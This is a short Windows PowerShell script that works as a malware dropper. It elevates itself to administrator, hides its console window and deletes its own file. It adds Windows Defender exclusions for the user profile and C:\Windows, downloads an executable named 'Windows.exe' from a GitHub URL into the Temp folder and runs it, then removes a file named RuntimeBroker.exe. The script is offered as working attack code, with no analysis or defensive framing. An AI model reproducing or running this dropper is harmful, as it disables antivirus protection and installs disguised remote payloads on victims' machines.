if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$console = [Console.Window]::GetConsoleWindow()
# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\Windows
$url = "https://github.com/Mohmmmasdasd/1/raw/refs/heads/main/Windows.exe"
$output = "$env:Temp/Windows.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
Start-Sleep -Milliseconds 6000 
Remove-Item -path "$env:Temp/RuntimeBroker.exe"